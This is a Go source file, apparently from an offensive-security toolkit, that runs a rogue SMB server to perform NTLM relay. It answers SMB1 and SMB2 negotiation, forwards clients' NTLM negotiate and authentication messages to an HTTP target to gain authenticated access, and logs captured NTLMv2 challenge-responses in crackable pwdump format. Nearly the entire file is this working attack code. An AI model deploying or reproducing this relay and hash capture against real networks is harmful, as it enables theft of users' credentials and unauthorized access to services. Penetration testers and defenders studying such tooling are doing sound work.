package gopRelay

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"slices"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/hophouse/gop/authentication/ntlm"
	gopproxy "github.com/hophouse/gop/gopProxy"
	"github.com/hophouse/gop/utils/logger"
)

func RunSMBServer(serverAddr string, ProcessIncomingConnChan chan incomingConn) {
	serverAddrTCP4, err := net.ResolveTCPAddr("tcp", serverAddr)
	if err != nil {
		logger.Fatal(err)
	}

	logger.Printf("[+] Run SMB server on : %s\n", serverAddrTCP4.String())

	l, err := net.ListenTCP("tcp4", serverAddrTCP4)
	if err != nil {
		logger.Fatal(err)
	}
	defer l.Close()

	for {
		conn, err := l.AcceptTCP()
		if err != nil {
			logger.Println(err)
			break
		}
		// defer conn.Close()

		ProcessIncomingConnChan <- incomingConn{
			f:    HandleSMBServer,
			conn: conn,
		}
	}
}

func HandleSMBServer(n *NTLMAuthHTTPRelay, conn *net.TCPConn, target string) error {
	n.ClientConnUUID = "SMB-" + n.ClientConnUUID

	err := conn.SetKeepAlive(true)
	if err != nil {
		logger.Println(err)
		return err
	}

	err = conn.SetKeepAlivePeriod(30 * time.Second)
	if err != nil {
		logger.Printf("Unable to set keepalive interval - %s", err)
	}

	err = n.ProcessSMBServer(target)
	if err != nil {
		logger.Printf("Error whil processing targets: %s\n", err)
		return err
	}

	return nil
}

func (n *NTLMAuthHTTPRelay) ProcessSMBServer(target string) error {
	n.mu.Lock()
	defer n.mu.Unlock()

	targetURLSanitized := strings.Replace(
		strings.Replace(
			strings.Replace(
				strings.Replace(target, "?", "", -1),
				"#", "", -1),
			":", "", -1),
		"/", "", -1)

	currentRelay := Relay{
		relayUUID:            "HTTP-" + strings.Split(uuid.NewString(), "-")[0],
		parentClientConnUUID: n.ClientConnUUID,
		target:               target,
		mu:                   &sync.Mutex{},
	}
	currentRelay.filename = fmt.Sprintf("%s-%s-%s-%s.html", time.Now().Format("20060102-150405"), n.ClientConnUUID, currentRelay.relayUUID, targetURLSanitized)

	// proxyURL, _ := url.Parse("http://127.0.0.1:8888")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		// Proxy:           http.ProxyURL(proxyURL),
	}
	currentRelay.conn = &http.Client{Transport: tr}

	for {

		buffer := make([]byte, 4096)
		size, err := n.clientConn.Read(buffer)
		if err != nil {
			logger.Fprintln(logger.Writer(), err)
			return err
		}

		netbiosSessionRequest := &NetBiosPacket{}
		err = netbiosSessionRequest.Read(buffer[0:4])
		if err != nil {
			err := fmt.Errorf("uknown packet length header %v", buffer[0:4])
			logger.Fprintln(logger.Writer(), err)
			return err
		}

		smbSessionRequest := buffer[4:size]
		if slices.Compare(smbSessionRequest[0:4], []byte("\xFFSMB")) == 0 {
			logger.Fprintln(logger.Writer(), "[+] SMB version is 1")
			smbHeader := &SMB1_REQUEST_HEADER{}
			smbHeader.Read(smbSessionRequest)

			logger.Println(smbHeader.ToString())

			switch smbHeader.Command {
			case SMB_COM_NEGOTIATE:
				sessionComNegotiate := &SMB1_NEGOTIATE_REQUEST{}
				sessionComNegotiate.Read(buffer[36:])

				logger.Println(sessionComNegotiate.ToString())

				// SMB
				// SMB2 Header
				smbHeader := &SMB2_HEADER_SYNC{
					ProtocolID:    []byte{0xFE, 'S', 'M', 'B'},
					StructureSize: 64,
					CreditCharge:  0,
					NT_STATUS:     0x00000000, // STATUS_SUCCESS
					Command:       SMB2_COM_NEGOTIATE,
					Credits:       1,
					Flags:         0x00000001, // This is a responnse
					NextCommand:   0x00000000,
					MessageID:     0x00000000,
					Reserved:      0x00000000,
					TreeID:        0x00000000,
					SessionID:     0x00,
					Signature:     [16]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
				}

				// SMB2 Negotiate Protcol Response
				sessionComNegotiateResponse := NewSMB2_NEGOTIATE_RESPONSE()

				// Compute packet
				resp, err := CreatePacket(smbHeader.ToBytes(), sessionComNegotiateResponse.ToBytes())
				if err != nil {
					logger.Fprintln(logger.Writer(), err)
					return err
				}

				// Send packet
				_, err = n.clientConn.Write(resp)
				if err != nil {
					logger.Fprintln(logger.Writer(), err)
					return err
				}

				continue
			default:
				logger.Printf("SMB header commande \"%s\" is not implemented", SMB_COMMAND_NAMES[smbHeader.Command])
				continue
			}

		} else if slices.Compare(smbSessionRequest[0:4], []byte("\xFESMB")) == 0 {
			logger.Fprintln(logger.Writer(), "[+] SMB version is 2/3")
			smbHeader := &SMB2_HEADER_SYNC{}
			smbHeader.Read(smbSessionRequest)

			logger.Println(smbHeader.ToString())

			switch smbHeader.Command {
			case SMB2_COM_NEGOTIATE:
				//
				// Read packet
				//

				sessionComNegotiate := &SMB2_NEGOTIATE_REQUEST{}
				err := sessionComNegotiate.Read(buffer[smbHeader.StructureSize:])
				if err != nil {
					logger.Fprintln(logger.Writer(), err)
					return err
				}

				logger.Println(sessionComNegotiate.ToString())

				//
				// Write packet
				//

				// SMB
				// SMB2 Header
				smbHeader := &SMB2_HEADER_SYNC{
					ProtocolID:    []byte{0xFE, 'S', 'M', 'B'},
					StructureSize: 64,
					CreditCharge:  0,
					NT_STATUS:     0x00000000, // STATUS_SUCCESS
					Command:       SMB2_COM_NEGOTIATE,
					Credits:       1,
					Flags:         0x00000001, // This is a responnse
					NextCommand:   0x00000000,
					MessageID:     0x00000000,
					Reserved:      0x00000000,
					TreeID:        0x00000000,
					SessionID:     0x00,
					Signature:     [16]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
				}

				// SMB2 Negotiate Protcol Response
				sessionComNegotiateResponse := NewSMB2_NEGOTIATE_RESPONSE()

				// Compute packet
				resp, err := CreatePacket(smbHeader.ToBytes(), sessionComNegotiateResponse.ToBytes())
				if err != nil {
					logger.Fprintln(logger.Writer(), err)
					return err
				}

				// Send packet
				_, err = n.clientConn.Write(resp)
				if err != nil {
					logger.Println(err)
					return err
				}

				continue
			case SMB2_COM_SESSION_SETUP:
				//
				// Read packet
				//

				sessionComSessionSetupRequest := &SMB2_COM_SESSION_SETUP_REQUEST{}
				// TODO Look why adding 4 bytes was the solution
				err := sessionComSessionSetupRequest.Read(buffer[smbHeader.StructureSize+4:])
				if err != nil {
					logger.Fprintln(logger.Writer(), err)
					return err
				}

				NTLMSSPMessage := append([]byte{0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x0}, bytes.Split(sessionComSessionSetupRequest.Buffer,
					[]byte{0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x0})[1]...)
				msgType := binary.LittleEndian.Uint32(NTLMSSPMessage[8:12])

				switch msgType {
				//
				// NTLM NEGOTIATE
				//
				case 1:

					//
					// Decode the NTLM SSP Negotiate packet
					//

					serverNegotiateRequest := ntlm.NTLMSSP_NEGOTIATE{}
					serverNegotiateRequest.Read(NTLMSSPMessage)

					logger.Printf("%s | %s | client :: gop | [+] NTLM NEGOTIATE\n", n.ClientConnUUID, currentRelay.relayUUID)
					for _, line := range strings.Split(serverNegotiateRequest.ToString(), "\n") {
						logger.Printf("%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
					}

					/*
					 *
					 * Client part
					 *
					 */
					authorization_bytes, err := func() ([]byte, error) {

						clientInitialRequest, err := http.NewRequest(http.MethodGet, target, nil)
						if err != nil {
							logger.Println(err)
							return nil, err
						}

						clientInitialResponse, err := currentRelay.SendRequestGetResponse(clientInitialRequest, "gop", "target")
						if err != nil {
							logger.Println(err)
							return nil, err
						}

						if _, exist := clientInitialResponse.Header["Www-Authenticate"]; !exist {
							err := fmt.Errorf("no authorization header present on the client")
							logger.Println(err)
							return nil, err

						}

						clientNegotiateRequest := gopproxy.CopyRequest(clientInitialRequest)
						clientNegotiateRequest.URL, err = url.Parse(currentRelay.target)
						if err != nil {
							logger.Println(err)
							return nil, err
						}
						clientNegotiateRequest.Header.Add("Authorization", fmt.Sprintf("NTLM %s", base64.StdEncoding.EncodeToString(serverNegotiateRequest.ToBytes())))

						clientNegotiateResponse, err := currentRelay.SendRequestGetResponse(clientNegotiateRequest, "gop", "target")
						if err != nil {
							logger.Println(err)
							return nil, err
						}

						authorization := clientNegotiateResponse.Header.Get("Www-Authenticate")

						if clientNegotiateResponse.StatusCode != 401 {
							err := fmt.Errorf("client respond with a %s code", clientNegotiateResponse.Status)
							logger.Printf("%s | %s | Error       : %s\n", n.ClientConnUUID, currentRelay.relayUUID, err)
							currentRelay.conn.CloseIdleConnections()
							return nil, err
						}

						authorization_bytes, err := base64.StdEncoding.DecodeString(authorization[5:])
						if err != nil {
							err := fmt.Errorf("clientNegotiateResponse : decode error authorization header : %s", authorization)
							return nil, err
						}

						return authorization_bytes, nil

					}()

					if err != nil {
						logger.Println(err)
						return err
					}

					logger.Printf("\n\n[+]Authorization bytes:\n %x\n\n", authorization_bytes)

					/*
					 *
					 * End client part
					 *
					 */

					clientNTLMSSPChallengeResponse := ntlm.NTLMSSP_CHALLENGE{}
					clientNTLMSSPChallengeResponse.Read(authorization_bytes)

					logger.Fprintf(logger.Writer(), "%s | %s | gop :: target | [+] Client Challenge\n", n.ClientConnUUID, currentRelay.relayUUID)
					for _, line := range strings.Split(clientNTLMSSPChallengeResponse.ToString(), "\n") {
						fmt.Printf("%s | %s | gop :: target | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
					}

					//
					// Write packet
					//

					// SMB
					// SMB2 Header
					smbHeader := &SMB2_HEADER_SYNC{
						ProtocolID:    []byte{0xFE, 'S', 'M', 'B'},
						StructureSize: 64,
						CreditCharge:  1,
						NT_STATUS:     binary.LittleEndian.Uint32([]byte{0x16, 0x0, 0x0, 0xc0}), // STATUS_MORE_PROCESSING_REQUIRED
						Command:       SMB2_COM_SESSION_SETUP,
						Credits:       33,
						Flags:         0x00000001, // This is a responnse, Priority
						NextCommand:   0x00000000,
						MessageID:     0x00000001,
						Reserved:      0x0000feff,
						TreeID:        0x00000000,
						SessionID:     binary.LittleEndian.Uint64([]byte{0xaf, 0x39, 0x7d, 0xdd, 0x0, 0x0, 0x0, 0x0}),
						// SessionID: 0x0,
						Signature: [16]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
					}

					// Get the security buffer :
					logger.Print("\n[+] Client NTLMSSP Session Setup Response :\n")
					// logger.Print(clientNTLMSSPChallengeResponse.ToString())

					// Create a new security buffer
					logger.Print("\n[+] Create a new buffer :\n")
					// secBuff := clientNTLMSSPChallengeResponse
					secBuff := ntlm.NewNTLMSSP_CHALLENGEShort()
					secBuff.Challenge = clientNTLMSSPChallengeResponse.Challenge
					// secBuff.Flags = serverNegotiateRequest.Flags ^ SMB2_FLAGS_SIGNED
					logger.Print(secBuff.ToString())

					// SMB2 Session Setup Response created with the client NTLMSSP Challenge response
					sessionComSessionSetupResponse := NewSMB2_COM_SESSION_SETUP_RESPONSE(secBuff.ToBytes(), 1)

					// Compute packet
					resp, err := CreatePacket(smbHeader.ToBytes(), sessionComSessionSetupResponse.ToBytes())
					if err != nil {
						logger.Fprintln(logger.Writer(), err)
						return err
					}

					// Send packet
					_, err = n.clientConn.Write(resp)
					if err != nil {
						logger.Println(err)
						return err
					}

					continue

				//
				// NTLM AUTH
				//
				case 3:
					//
					// Decode the NTLM SSP AUTH packet
					//

					serverAuthRequest := ntlm.NTLMSSP_AUTH{}
					serverAuthRequest.Read(NTLMSSPMessage)
					logger.Printf("[NTLM-AUTH] [%s] [%s] [%s] ", serverAuthRequest.TargetName.Payload, serverAuthRequest.Username.Payload, serverAuthRequest.Workstation.Payload)
					logger.Printf("[NTLM message type 3]\n%s", serverAuthRequest.ToString())

					logger.Printf("%s | %s | client :: gop | [+] NTLM NEGOTIATE\n", n.ClientConnUUID, currentRelay.relayUUID)
					for _, line := range strings.Split(serverAuthRequest.ToString(), "\n") {
						logger.Printf("%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
					}

					ntlmv2Response := ntlm.NTLMv2Response{}
					ntlmv2Response.Read(serverAuthRequest.NTLMv2Response.Payload)
					logger.Printf("%s", ntlmv2Response.ToString())

					ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(serverAuthRequest.Username.Payload), string(serverAuthRequest.TargetName.Payload), []byte(ntlm.Challenge), ntlmv2Response.NTProofStr, serverAuthRequest.NTLMv2Response.Payload[len(ntlmv2Response.NTProofStr):])

					authInformations := fmt.Sprintf("%s:%s", string(serverAuthRequest.TargetName.Payload), string(serverAuthRequest.Username.Payload))
					if _, found := ntlm.NtlmCapturedAuth[authInformations]; !found {
						ntlm.NtlmCapturedAuth[authInformations] = true
						logger.Printf("[PWDUMP] %s", ntlmv2_pwdump)
					} else {
						logger.Printf("[+] User %s NTLMv2 challenge was already captured.\n", authInformations)
					}

					/*
					 *
					 * Client part
					 *
					 */
					clientAuthRequest, _ := http.NewRequest("GET", target, nil)
					clientAuthRequest.Header.Add("Authorization", fmt.Sprintf("NTLM %s", base64.StdEncoding.EncodeToString(NTLMSSPMessage)))
					clientAuthResponse, err := currentRelay.SendRequestGetResponse(clientAuthRequest, "gop", "target")
					if err != nil {
						logger.Println(err)
						continue
						// return err
					}

					if clientAuthResponse.StatusCode == 401 {
						return fmt.Errorf("could not authenticate to the endpoint")
					}

					currentRelay.AuthorizationHeader = clientAuthRequest.Header.Get("Authorization")

					/*
					 *
					 * End client part
					 *
					 */

					goto end

				default:
					logger.Printf("NTLM msg type \"%d\" is not implemented", msgType)
					continue
				}

			default:
				logger.Printf("SMB2 header commande \"%s\" is not implemented", SMB2_COMMAND_NAMES[smbHeader.Command])
				continue
			}
		} else {
			err := fmt.Errorf("unknown SMB version %x requested by the client", buffer[0:4])
			logger.Fprintln(logger.Writer(), err)
			return err
		}

	}

end:
	n.Relays[currentRelay.target] = &currentRelay

	return nil
}
